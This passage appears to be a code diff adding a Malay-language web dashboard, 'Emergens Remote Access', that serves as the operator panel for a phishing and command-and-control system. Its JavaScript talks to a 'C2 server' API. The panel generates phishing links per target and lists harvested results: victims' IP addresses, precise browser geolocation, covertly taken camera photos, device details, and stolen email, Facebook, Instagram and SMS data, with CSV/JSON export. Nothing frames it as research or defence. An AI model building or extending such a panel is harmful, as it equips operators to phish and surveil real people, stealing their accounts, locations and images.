+                    <i class="fa-solid fa-gauge-high"></i> <span>Overview</span>
+                </div>
+                <div class="nav-item" data-section="devices" onclick="switchSection('devices')">
+                    <i class="fa-solid fa-mobile-screen"></i> <span>Perangkat</span>
+                    <span class="nav-badge" id="deviceNavBadge">0</span>
+                </div>
+                <div class="nav-item" data-section="activities" onclick="switchSection('activities')">
+                    <i class="fa-solid fa-clock-rotate-left"></i> <span>Aktiviti</span>
+                    <span class="nav-badge" id="activityNavBadge">0</span>
+                </div>
+                <div class="nav-section-label">Modul</div>
+                <div class="nav-item" data-section="phishing" onclick="switchSection('phishing')">
+                    <i class="fa-solid fa-fish"></i> <span>Phishing</span>
+                </div>
+                <div class="nav-item active" data-section="results" onclick="switchSection('results')">
+                    <i class="fa-solid fa-database"></i> <span>Hasil</span>
+                    <span class="nav-badge" id="resultNavBadge">0</span>
+                </div>
+                <div class="nav-section-label">Sistem</div>
+                <div class="nav-item" data-section="settings" onclick="switchSection('settings')">
+                    <i class="fa-solid fa-gear"></i> <span>Settings</span>
+                </div>
+                <div class="nav-item" onclick="goToDashboard()">
+                    <i class="fa-solid fa-arrow-left"></i> <span>Kembali Dashboard</span>
+                </div>
+            </nav>
+            <div class="sidebar-footer">
+                <div class="user-chip">
+                    <div class="user-avatar" id="userAvatar">A</div>
+                    <div>
+                        <div class="user-name" id="userName">Admin</div>
+                        <div class="user-role" id="userRole">OPERATOR</div>
+                    </div>
+                </div>
+            </div>
+        </aside>
+
+        <div class="main-area">
+            <header class="top-bar">
+                <button class="menu-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+                <div>
+                    <div class="page-title">Emergens Remote Access</div>
+                    <div class="page-subtitle">Kawalan peranti dan sistem jarak jauh</div>
+                </div>
+                <div class="top-bar-right">
+                    <div class="connection-dot" id="connectionDot" title="Connection status"></div>
+                    <button class="top-btn" id="notifToggle" onclick="toggleNotifications()" title="Toggle notifications">
+                        <i class="fa-solid fa-bell"></i>
+                    </button>
+                    <button class="top-btn" onclick="refreshAllData()" title="Muat semula"><i class="fa-solid fa-rotate"></i></button>
+                    <button class="top-btn" onclick="toggleTheme()" title="Tukar tema"><i class="fa-solid fa-moon" id="themeIcon"></i></button>
+                    <button class="top-btn" onclick="goToDashboard()" title="Dashboard"><i class="fa-solid fa-house"></i></button>
+                </div>
+            </header>
+
+            <div class="content-area">
+                <div id="section-overview">
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--blue-glow-soft);color:var(--blue-300)"><i class="fa-solid fa-mobile-screen"></i></div>
+                            <div class="stat-card-value" id="deviceCountStat">0</div>
+                            <div class="stat-card-label">Jumlah Perangkat</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--green-glow);color:var(--green)"><i class="fa-solid fa-wifi"></i></div>
+                            <div class="stat-card-value" id="onlineCountStat">0</div>
+                            <div class="stat-card-label">Online</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--cyan-glow);color:var(--cyan-400)"><i class="fa-solid fa-database"></i></div>
+                            <div class="stat-card-value" id="resultCountStat">0</div>
+                            <div class="stat-card-label">Hasil Phishing</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--indigo-glow);color:var(--indigo-400)"><i class="fa-solid fa-check-circle"></i></div>
+                            <div class="stat-card-value" id="permissionCountStat">0</div>
+                            <div class="stat-card-label">Permission Diberi</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--yellow-glow);color:var(--yellow)"><i class="fa-solid fa-location-dot"></i></div>
+                            <div class="stat-card-value" id="locationCountStat">0</div>
+                            <div class="stat-card-label">Lokasi Diperoleh</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-card-icon" style="background:var(--red-glow);color:var(--red)"><i class="fa-solid fa-camera"></i></div>
+                            <div class="stat-card-value" id="cameraCountStat">0</div>
+                            <div class="stat-card-label">Foto Diperoleh</div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">Aktiviti Terkini</div>
+                            <button class="refresh-btn" onclick="switchSection('activities')">Lihat Semua <i class="fa-solid fa-arrow-right"></i></button>
+                        </div>
+                        <div id="recentActivitiesFeed"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan...</p></div></div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">Hasil Phishing Terkini</div>
+                            <button class="refresh-btn" onclick="switchSection('results')">Lihat Semua <i class="fa-solid fa-arrow-right"></i></button>
+                        </div>
+                        <div id="recentResultsFeed"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan...</p></div></div>
+                    </div>
+                </div>
+
+                <div id="section-devices" style="display:none">
+                    <div class="section-header">
+                        <div>
+                            <div class="section-title">Daftar Perangkat</div>
+                            <div class="section-desc">Peranti yang disambungkan ke sistem C2</div>
+                        </div>
+                        <div style="display:flex;gap:8px">
+                            <button class="refresh-btn" onclick="fetchDevices()"><i class="fa-solid fa-rotate"></i> Muat Semula</button>
+                        </div>
+                    </div>
+                    <div class="filter-bar">
+                        <input type="text" id="deviceSearchInput" class="filter-input" placeholder="Cari perangkat..." oninput="filterDevices()">
+                        <select id="deviceStatusFilter" class="filter-select" onchange="filterDevices()">
+                            <option value="all">Semua Status</option>
+                            <option value="online">Online</option>
+                            <option value="offline">Offline</option>
+                        </select>
+                    </div>
+                    <div class="card" id="deviceListCard"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan...</p></div></div>
+                </div>
+
+                <div id="section-activities" style="display:none">
+                    <div class="section-header">
+                        <div>
+                            <div class="section-title">Log Aktiviti</div>
+                            <div class="section-desc">Rekod aktiviti peranti dan sistem</div>
+                        </div>
+                        <button class="refresh-btn" onclick="fetchActivities()"><i class="fa-solid fa-rotate"></i> Muat Semula</button>
+                    </div>
+                    <div class="filter-bar">
+                        <input type="text" id="activitySearchInput" class="filter-input" placeholder="Cari aktiviti..." oninput="filterActivities()">
+                        <button class="filter-btn" onclick="clearActivityFilter()"><i class="fa-solid fa-times"></i> Clear</button>
+                    </div>
+                    <div class="card" id="activityListCard"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan...</p></div></div>
+                </div>
+
+                <div id="section-phishing" style="display:none">
+                    <div class="section-header">
+                        <div>
+                            <div class="section-title">Modul Phishing</div>
+                            <div class="section-desc">Pilih jenis phishing atau jana pautan</div>
+                        </div>
+                    </div>
+                    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:12px;margin-bottom:18px">
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('location')">
+                            <i class="fa-solid fa-location-dot" style="font-size:20px;color:var(--blue-300)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Location</div>
+                        </div>
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('photo')">
+                            <i class="fa-solid fa-camera" style="font-size:20px;color:var(--cyan-400)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Photo</div>
+                        </div>
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('email')">
+                            <i class="fa-solid fa-envelope" style="font-size:20px;color:var(--indigo-400)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Email</div>
+                        </div>
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('facebook')">
+                            <i class="fa-brands fa-facebook" style="font-size:20px;color:var(--blue-400)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Facebook</div>
+                        </div>
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('instagram')">
+                            <i class="fa-brands fa-instagram" style="font-size:20px;color:var(--cyan-400)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Instagram</div>
+                        </div>
+                        <div class="card" style="text-align:center;cursor:pointer;margin-bottom:0" onclick="showPhishingForm('auto')">
+                            <i class="fa-solid fa-bolt" style="font-size:20px;color:var(--green)"></i>
+                            <div style="font-size:12px;font-weight:700;margin-top:8px">Auto-Permission</div>
+                        </div>
+                    </div>
+                    <div class="card" id="phishingFormCard" style="display:none">
+                        <div class="card-header"><div class="card-title" id="phishingFormTitle">Borang Phishing</div></div>
+                        <div style="margin-bottom:10px">
+                            <label style="font-size:10px;font-weight:600;color:var(--text-secondary);letter-spacing:1px;text-transform:uppercase">Target</label>
+                            <input type="text" id="phishingTarget" class="input-field" placeholder="Masukkan target">
+                        </div>
+                        <button class="btn-submit" onclick="submitPhishing()"><i class="fa-solid fa-paper-plane"></i> Hantar</button>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><div class="card-title">Penjana Pautan Phishing</div></div>
+                        <div style="margin-bottom:10px">
+                            <label style="font-size:10px;font-weight:600;color:var(--text-secondary);letter-spacing:1px;text-transform:uppercase">ID / Nama Sasaran</label>
+                            <input type="text" id="phishingTargetInput" class="input-field" placeholder="Contoh: 2555">
+                        </div>
+                        <button class="btn-submit" onclick="generatePhishingLink()"><i class="fa-solid fa-link"></i> Jana Pautan</button>
+                        <div id="generatedLinkBox" style="display:none;margin-top:12px;padding:12px;background:var(--bg-input);border:1px solid var(--border-accent);border-radius:8px;text-align:center;font-family:var(--font-mono);font-size:12px;color:var(--blue-300);word-break:break-all">
+                            <span id="generatedLinkText"></span>
+                            <button onclick="copyGeneratedLink()" style="background:var(--blue-glow-soft);border:1px solid var(--border-accent);color:var(--blue-300);padding:5px 10px;border-radius:5px;font-size:9px;cursor:pointer;margin-left:8px">Salin</button>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><div class="card-title">Pautan Aktif</div></div>
+                        <div id="activeLinksList"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan...</p></div></div>
+                    </div>
+                </div>
+
+                <div id="section-results">
+                    <div class="section-header">
+                        <div>
+                            <div class="section-title">Hasil Phishing</div>
+                            <div class="section-desc">Data yang dikumpul termasuk lokasi, foto, peranti, dan permission</div>
+                        </div>
+                        <div style="display:flex;gap:8px;flex-wrap:wrap">
+                            <button class="refresh-btn" onclick="exportResults('csv')"><i class="fa-solid fa-file-csv"></i> CSV</button>
+                            <button class="refresh-btn" onclick="exportResults('json')"><i class="fa-solid fa-file-code"></i> JSON</button>
+                            <button class="refresh-btn" onclick="fetchPhishingResults()"><i class="fa-solid fa-rotate"></i> Muat Semula</button>
+                        </div>
+                    </div>
+                    <div class="filter-bar">
+                        <input type="text" id="resultSearchInput" class="filter-input" placeholder="Cari target atau IP..." oninput="filterResults()">
+                        <select id="resultTypeFilter" class="filter-select" onchange="filterResults()">
+                            <option value="all">Semua Jenis</option>
+                            <option value="location">Location</option>
+                            <option value="photo">Photo</option>
+                            <option value="email">Email</option>
+                            <option value="facebook">Facebook</option>
+                            <option value="instagram">Instagram</option>
+                            <option value="auto">Auto-Permission</option>
+                        </select>
+                        <select id="resultSortOrder" class="filter-select" onchange="filterResults()">
+                            <option value="newest">Terbaru</option>
+                            <option value="oldest">Terlama</option>
+                            <option value="target">Nama Target</option>
+                        </select>
+                        <button class="filter-btn" onclick="clearResultFilter()"><i class="fa-solid fa-times"></i> Clear</button>
+                    </div>
+                    <div class="card">
+                        <div id="phishingResultsFeed"><div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><p>Memuatkan hasil...</p></div></div>
+                    </div>
+                </div>
+
+                <div id="section-settings" style="display:none">
+                    <div class="section-header">
+                        <div>
+                            <div class="section-title">Settings</div>
+                            <div class="section-desc">Konfigurasi sistem</div>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><div class="card-title">Auto Refresh</div></div>
+                        <div style="display:flex;align-items:center;gap:12px">
+                            <button class="refresh-btn active" id="autoRefreshToggle" onclick="toggleAutoRefresh()">
+                                <i class="fa-solid fa-check"></i> Aktif
+                            </button>
+                            <span style="font-size:10px;color:var(--text-muted)">Auto refresh setiap 5 saat</span>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><div class="card-title">Tema</div></div>
+                        <div style="display:flex;gap:10px">
+                            <button class="refresh-btn active" onclick="setTheme('dark')"><i class="fa-solid fa-moon"></i> Dark</button>
+                            <button class="refresh-btn" onclick="setTheme('light')"><i class="fa-solid fa-sun"></i> Light</button>
+                        </div>
+                    </div>
+                    <div class="card">
+                        <div class="card-header"><div class="card-title">Sistem Info</div></div>
+                        <div id="systemInfoDisplay">
+                            <div class="data-grid">
+                                <div class="data-item">
+                                    <div class="data-item-label">C2 Server</div>
+                                    <div class="data-item-value" id="c2ServerStatus">Disconnected</div>
+                                </div>
+                                <div class="data-item">
+                                    <div class="data-item-label">User</div>
+                                    <div class="data-item-value" id="settingsUserName">Admin</div>
+                                </div>
+                                <div class="data-item">
+                                    <div class="data-item-label">Role</div>
+                                    <div class="data-item-value" id="settingsUserRole">OPERATOR</div>
+                                </div>
+                                <div class="data-item">
+                                    <div class="data-item-label">Last Sync</div>
+                                    <div class="data-item-value" id="lastSyncTime">-</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-container" id="toastContainer"></div>
+    <div id="modalContainer"></div>
+
+    <script>
+        const C2_API_URL = 'http://localhost:5000/api';
+
+        let devices = [];
+        let activities = [];
+        let allResults = [];
+        let allLinks = [];
+        let refreshInterval = null;
+        let lastGeneratedLink = null;
+        let activePhishingType = null;
+        let expandedResults = new Set();
+        let autoRefreshEnabled = true;
+        let notificationsEnabled = true;
+        let isC2Connected = false;
+        let currentFilter = { search: '', type: 'all', sort: 'newest' };
+
+        async function apiRequest(endpoint, options = {}) {
+            try {
+                const response = await fetch(`${C2_API_URL}${endpoint}`, {
+                    headers: { 'Content-Type': 'application/json', ...options.headers },
+                    ...options
+                });
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                updateConnectionStatus(false);
+                document.getElementById('c2ServerStatus').textContent = 'Disconnected';
+                document.getElementById('c2ServerStatus').style.color = 'var(--red)';
+                throw error;
+            }
+        }
+
+        async function fetchDevices() {
+            try {
+                const data = await apiRequest('/devices');
+                devices = data.devices || [];
+                filterDevices();
+                updateStats();
+                updateNavBadges();
+                updateConnectionStatus(true);
+                document.getElementById('c2ServerStatus').textContent = 'Connected';
+                document.getElementById('c2ServerStatus').style.color = 'var(--green)';
+                document.getElementById('lastSyncTime').textContent = new Date().toLocaleTimeString();
+                renderRecentActivities();
+                renderRecentResults();
+            } catch (error) {
+                console.error('Fetch devices error:', error);
+                showToast('Gagal sambung ke C2 server', 'error');
+            }
+        }
+
+        async function fetchActivities() {
+            try {
+                const data = await apiRequest('/activities');
+                activities = data.activities || [];
+                filterActivities();
+                updateNavBadges();
+                renderRecentActivities();
+            } catch (error) {
+                console.error('Fetch activities error:', error);
+            }
+        }
+
+        async function fetchPhishingResults() {
+            try {
+                const data = await apiRequest('/results');
+                allResults = data.results || [];
+                applyResultFilter();
+                updateStats();
+                updateNavBadges();
+                document.getElementById('lastSyncTime').textContent = new Date().toLocaleTimeString();
+                renderRecentResults();
+            } catch (error) {
+                console.error('Fetch results error:', error);
+                showToast('Gagal fetch hasil: ' + error.message, 'error');
+            }
+        }
+
+        async function fetchLinks() {
+            try {
+                const data = await apiRequest('/links');
+                allLinks = data.links || [];
+                renderActiveLinks();
+            } catch (error) {
+                console.error('Fetch links error:', error);
+            }
+        }
+
+        async function refreshAllData() {
+            await Promise.all([fetchDevices(), fetchActivities(), fetchPhishingResults(), fetchLinks()]);
+            document.getElementById('lastSyncTime').textContent = new Date().toLocaleTimeString();
+            showToast('Semua data dikemas kini', 'success');
+        }
+
+        async function submitPhishing() {
+            const target = document.getElementById('phishingTarget').value.trim();
+            if (!target) { showToast('Sila isi target terlebih dahulu', 'error'); return; }
+            try {
+                const data = await apiRequest('/phishing', {
+                    method: 'POST',
+                    body: JSON.stringify({ type: activePhishingType, target })
+                });
+                if (data.success) {
+                    showToast('Berjaya dihantar', 'success');
+                    document.getElementById('phishingTarget').value = '';
+                    fetchPhishingResults();
+                    fetchActivities();
+                } else {
+                    showToast('Gagal menghantar', 'error');
+                }
+            } catch (error) {
+                console.error('Submit error:', error);
+                showToast('Gagal menghantar: ' + error.message, 'error');
+            }
+        }
+
+        async function generatePhishingLink() {
+            const targetInput = document.getElementById('phishingTargetInput');
+            const targetId = targetInput.value.trim();
+            if (!targetId) { showToast('Sila masukkan ID atau nama sasaran', 'error'); return; }
+            try {
+                const data = await apiRequest('/links/generate', {
+                    method: 'POST',
+                    body: JSON.stringify({ target_id: targetId })
+                });
+                if (data.success) {
+                    lastGeneratedLink = data.generated_url;
+                    document.getElementById('generatedLinkText').textContent = data.generated_url;
+                    document.getElementById('generatedLinkBox').style.display = 'block';
+                    targetInput.value = '';
+                    fetchLinks();
+                    showToast('Pautan dijana', 'success');
+                } else {
+                    showToast('Gagal menjana pautan', 'error');
+                }
+            } catch (error) {
+                console.error('Generate error:', error);
+                showToast('Gagal menjana: ' + error.message, 'error');
+            }
+        }
+
+        function copyGeneratedLink() {
+            if (!lastGeneratedLink) return;
+            navigator.clipboard.writeText(lastGeneratedLink).then(() => {
+                showToast('Pautan disalin', 'success');
+            });
+        }
+
+        function copyLink(url) {
+            if (!url) return;
+            navigator.clipboard.writeText(url).then(() => {
+                showToast('Pautan disalin', 'success');
+            });
+        }
+
+        async function deleteLink(linkId) {
+            if (!confirm('Padam pautan ini?')) return;
+            try {
+                const data = await apiRequest(`/links/${linkId}`, { method: 'DELETE' });
+                if (data.success) {
+                    showToast('Pautan dipadam', 'success');
+                    fetchLinks();
+                } else {
+                    showToast('Gagal padam pautan', 'error');
+                }
+            } catch (error) {
+                console.error('Delete link error:', error);
+                showToast('Gagal padam pautan', 'error');
+            }
+        }
+
+        async function deleteResult(resultId) {
+            if (!confirm('Padam hasil phishing ini?')) return;
+            try {
+                const data = await apiRequest(`/results/${resultId}`, { method: 'DELETE' });
+                if (data.success) {
+                    showToast('Hasil dipadam', 'success');
+                    fetchPhishingResults();
+                } else {
+                    showToast('Gagal padam hasil', 'error');
+                }
+            } catch (error) {
+                console.error('Delete result error:', error);
+                showToast('Gagal padam hasil', 'error');
+            }
+        }
+
+        async function deleteDevice(deviceId) {
+            if (!confirm('Padam perangkat ini?')) return;
+            try {
+                const data = await apiRequest(`/devices/${deviceId}`, { method: 'DELETE' });
+                if (data.success) {
+                    showToast('Perangkat dipadam', 'success');
+                    fetchDevices();
+                } else {
+                    showToast('Gagal padam perangkat', 'error');
+                }
+            } catch (error) {
+                console.error('Delete device error:', error);
+                showToast('Gagal padam perangkat', 'error');
+            }
+        }
+
+        async function deleteActivity(activityId) {
+            if (!confirm('Padam aktiviti ini?')) return;
+            try {
+                const data = await apiRequest(`/activities/${activityId}`, { method: 'DELETE' });
+                if (data.success) {
+                    showToast('Aktiviti dipadam', 'success');
+                    fetchActivities();
+                } else {
+                    showToast('Gagal padam aktiviti', 'error');
+                }
+            } catch (error) {
+                console.error('Delete activity error:', error);
+                showToast('Gagal padam aktiviti', 'error');
+            }
+        }
+
+        function renderActiveLinks() {
+            const container = document.getElementById('activeLinksList');
+            if (!allLinks || allLinks.length === 0) {
+                container.innerHTML = '<div class="empty-state"><i class="fa-solid fa-link"></i><p>Tiada pautan aktif</p></div>';
+                return;
+            }
+            container.innerHTML = allLinks.slice(0, 20).map(link => `
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;border-bottom:1px solid var(--border)">
+                    <i class="fa-solid fa-link" style="color:var(--blue-300);font-size:12px"></i>
+                    <div style="flex:1;min-width:0">
+                        <div style="font-size:11px;font-weight:600;color:var(--text-primary)">${escapeHtml(link.target_id || 'Unknown')}</div>
+                        <div style="font-size:9px;color:var(--text-muted);font-family:var(--font-mono);word-break:break-all">${escapeHtml(link.generated_url || '')}</div>
+                    </div>
+                    <span style="font-size:8px;color:${link.status === 'active' ? 'var(--green)' : 'var(--text-muted)'}">${link.status === 'active' ? 'ACTIVE' : 'INACTIVE'}</span>
+                    <button class="expand-btn" onclick="copyLink('${escapeHtml(link.generated_url || '')}')"><i class="fa-solid fa-copy"></i></button>
+                    <button class="delete-btn" onclick="deleteLink('${escapeHtml(link.id)}')"><i class="fa-solid fa-trash"></i></button>
+                </div>
+            `).join('');
+        }
+
+        function applyResultFilter() {
+            const feed = document.getElementById('phishingResultsFeed');
+            if (!allResults || allResults.length === 0) {
+                feed.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>Tiada hasil phishing direkodkan</p></div>';
+                return;
+            }
+            let filtered = [...allResults];
+            if (currentFilter.search) {
+                const searchLower = currentFilter.search.toLowerCase();
+                filtered = filtered.filter(r => {
+                    return (r.target || '').toLowerCase().includes(searchLower) ||
+                           (r.ip_address || '').toLowerCase().includes(searchLower) ||
+                           (r.ip_geolocation && r.ip_geolocation.city && r.ip_geolocation.city.toLowerCase().includes(searchLower)) ||
+                           (r.ip_geolocation && r.ip_geolocation.country_name && r.ip_geolocation.country_name.toLowerCase().includes(searchLower));
+                });
+            }
+            if (currentFilter.type !== 'all') {
+                filtered = filtered.filter(r => r.type === currentFilter.type);
+            }
+            if (currentFilter.sort === 'oldest') {
+                filtered = filtered.reverse();
+            } else if (currentFilter.sort === 'target') {
+                filtered = filtered.sort((a, b) => (a.target || '').localeCompare(b.target || ''));
+            }
+            feed.innerHTML = filtered.map(result => buildResultCard(result)).join('');
+        }
+
+        function buildResultCard(result) {
+            const type = result.type || 'unknown';
+            const target = result.target || 'N/A';
+            const ip = result.ip_address || 'N/A';
+            const time = result.timestamp ? new Date(result.timestamp * 1000).toLocaleString() : 'N/A';
+            const id = result.id || Math.random().toString(36).substr(2);
+            const isExpanded = expandedResults.has(id);
+            let locationStr = 'N/A';
+            let coordinatesStr = 'N/A';
+            let accuracyStr = 'N/A';
+            if (result.ip_geolocation) {
+                const geo = result.ip_geolocation;
+                const parts = [geo.city, geo.region, geo.country_name].filter(Boolean);
+                if (parts.length > 0) locationStr = parts.join(', ');
+                if (geo.latitude && geo.longitude) coordinatesStr = geo.latitude.toFixed(6) + ', ' + geo.longitude.toFixed(6);
+            }
+            if (result.browser_geolocation) {
+                const bl = result.browser_geolocation;
+                if (bl.latitude && bl.longitude) {
+                    coordinatesStr = bl.latitude.toFixed(6) + ', ' + bl.longitude.toFixed(6);
+                    if (bl.accuracy) accuracyStr = bl.accuracy.toFixed(1) + ' m';
+                }
+            }
+            const typeBadges = { location: 'badge-location', ip_phishing: 'badge-ip', photo: 'badge-photo', email: 'badge-email', facebook: 'badge-facebook', instagram: 'badge-instagram', auto: 'badge-auto', camera: 'badge-camera', battery: 'badge-battery', network: 'badge-network' };
+            const badgeClass = typeBadges[type] || 'badge-location';
+            let expandedHtml = '';
+            if (isExpanded) {
+                expandedHtml = `
+                    <div style="margin-top:12px;padding-top:12px;border-top:1px solid var(--border)">
+                        <div class="data-grid">
+                            <div class="data-item"><div class="data-item-label">IP Address</div><div class="data-item-value">${escapeHtml(ip)}</div></div>
+                            <div class="data-item"><div class="data-item-label">Lokasi</div><div class="data-item-value">${escapeHtml(locationStr)}</div></div>
+                            <div class="data-item"><div class="data-item-label">Koordinat</div><div class="data-item-value">${escapeHtml(coordinatesStr)}</div></div>
+                            <div class="data-item"><div class="data-item-label">Accuracy</div><div class="data-item-value">${escapeHtml(accuracyStr)}</div></div>
+                            ${result.device_info ? `
+                            <div class="data-item"><div class="data-item-label">User Agent</div><div class="data-item-value">${escapeHtml(result.device_info.userAgent || 'Unknown')}</div></div>
+                            <div class="data-item"><div class="data-item-label">Platform</div><div class="data-item-value">${escapeHtml(result.device_info.platform || 'Unknown')}</div></div>
+                            <div class="data-item"><div class="data-item-label">Bahasa</div><div class="data-item-value">${escapeHtml(result.device_info.language || 'Unknown')}</div></div>
+                            <div class="data-item"><div class="data-item-label">Cores</div><div class="data-item-value">${escapeHtml(result.device_info.cores || 'Unknown')}</div></div>` : ''}
+                            ${result.permissions ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">Permissions</div><div class="data-item-value">${escapeHtml(JSON.stringify(result.permissions))}</div></div>` : ''}
+                            ${result.battery_info ? `<div class="data-item"><div class="data-item-label">Battery</div><div class="data-item-value">${escapeHtml(result.battery_info.level + '% (' + result.battery_info.charging + ')')}</div></div>` : ''}
+                            ${result.network_info ? `<div class="data-item"><div class="data-item-label">Network</div><div class="data-item-value">${escapeHtml(result.network_info.type || result.network_info.effectiveType)}</div></div>` : ''}
+                            ${result.camera_photo ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">Camera Photo</div><div class="data-item-value"><img src="${escapeHtml(result.camera_photo)}" class="photo-display" onclick="viewPhoto('${escapeHtml(result.camera_photo)}')" /></div></div>` : ''}
+                            ${result.email_data ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">Email Data</div><div class="data-item-value">${escapeHtml(JSON.stringify(result.email_data))}</div></div>` : ''}
+                            ${result.facebook_data ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">Facebook Data</div><div class="data-item-value">${escapeHtml(JSON.stringify(result.facebook_data))}</div></div>` : ''}
+                            ${result.instagram_data ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">Instagram Data</div><div class="data-item-value">${escapeHtml(JSON.stringify(result.instagram_data))}</div></div>` : ''}
+                            ${result.sms_data ? `<div class="data-item" style="grid-column:1/-1"><div class="data-item-label">SMS Data</div><div class="data-item-value">${escapeHtml(JSON.stringify(result.sms_data))}</div></div>` : ''}
+                        </div>
+                    </div>`;
+            }
+            const hasPermission = result.browser_geolocation || result.camera_photo || result.permissions;
+            const hasDevice = result.device_info;
+            const hasCamera = result.camera_photo;
+            return `
+                <div class="result-card">
+                    <div class="result-card-header">
+                        <div class="result-card-title">
+                            <span class="type-badge ${badgeClass}">${escapeHtml(type.toUpperCase())}</span>
+                            <span>${escapeHtml(target)}</span>
+                        </div>
+                        <div style="display:flex;align-items:center;gap:8px">
+                            <span class="result-card-time">${time}</span>
+                            <button class="expand-btn" onclick="toggleExpand('${id}')"><i class="fa-solid ${isExpanded ? 'fa-chevron-up' : 'fa-chevron-down'}"></i></button>
+                            <button class="delete-btn" onclick="deleteResult('${escapeHtml(id)}')"><i class="fa-solid fa-trash"></i></button>
+                        </div>
+                    </div>
+                    <div class="result-meta-row">
+                        <span><i class="fa-solid fa-network-wired" style="color:var(--cyan-400)"></i> ${escapeHtml(ip)}</span>
+                        <span><i class="fa-solid fa-location-dot" style="color:var(--blue-300)"></i> ${escapeHtml(locationStr)}</span>
+                        ${coordinatesStr !== 'N/A' ? `<span class="lat-lng-box" onclick="openMap('${coordinatesStr}')">${escapeHtml(coordinatesStr)}</span>` : ''}
+                        ${hasPermission ? `<span class="permission-indicator permission-granted"><i class="fa-solid fa-check"></i> Permission</span>` : ''}
+                        ${hasDevice ? `<span class="permission-indicator permission-granted"><i class="fa-solid fa-mobile-screen"></i> Device</span>` : ''}
+                        ${hasCamera ? `<span class="permission-indicator permission-granted"><i class="fa-solid fa-camera"></i> Foto</span>` : ''}
+                    </div>
+                    ${result.camera_photo && !isExpanded ? `<div style="margin-top:10px"><img src="${escapeHtml(result.camera_photo)}" class="photo-display" style="max-height:150px" onclick="viewPhoto('${escapeHtml(result.camera_photo)}')" /></div>` : ''}
+                    ${expandedHtml}
+                </div>`;
+        }
+
+        function toggleExpand(id) {
+            if (expandedResults.has(id)) expandedResults.delete(id);
+            else expandedResults.add(id);
+            applyResultFilter();
+        }
+
+        function viewPhoto(photoUrl) {
+            if (!photoUrl) return;
+            showModal(`
+                <div class="modal-header"><div class="modal-title">Foto</div><button class="modal-close" onclick="closeModal()"><i class="fa-solid fa-times"></i></button></div>
+                <div style="text-align:center"><img src="${escapeHtml(photoUrl)}" style="max-width:100%;max-height:70vh;border-radius:8px" /></div>
+            `);
+        }
+
+        function openMap(coords) {
+            const [lat, lng] = coords.split(',');
+            window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
+        }
+
+        function filterDevices() {
+            const card = document.getElementById('deviceListCard');
+            const searchInput = document.getElementById('deviceSearchInput');
+            const statusFilter = document.getElementById('deviceStatusFilter');
+            if (!card) return;
+            let filtered = [...devices];
+            if (searchInput) {
+                const search = searchInput.value.toLowerCase();
+                filtered = filtered.filter(d => (d.name || d.id || '').toLowerCase().includes(search));
+            }
+            if (statusFilter) {
+                const status = statusFilter.value;
+                if (status !== 'all') filtered = filtered.filter(d => d.status === status);
+            }
+            if (!filtered || filtered.length === 0) {
+                card.innerHTML = '<div class="empty-state"><i class="fa-solid fa-plug-circle-xmark"></i><p>Tiada perangkat</p></div>';
+                return;
+            }
+            card.innerHTML = filtered.map(dev => `
+                <div style="display:flex;align-items:center;gap:10px;padding:12px;border-bottom:1px solid var(--border)">
+                    <i class="fa-solid fa-mobile-screen" style="color:var(--blue-300);font-size:16px"></i>
+                    <div style="flex:1">
+                        <div style="font-size:12px;font-weight:600">${escapeHtml(dev.name || dev.id)}</div>
+                        <div style="font-size:9px;color:var(--text-muted)">${escapeHtml(dev.model || 'Unknown')} | ${escapeHtml(dev.os || 'Unknown OS')}</div>
+                    </div>
+                    <span style="font-size:9px;color:${dev.status === 'online' ? 'var(--green)' : 'var(--text-muted)'}">${dev.status === 'online' ? 'ONLINE' : 'OFFLINE'}</span>
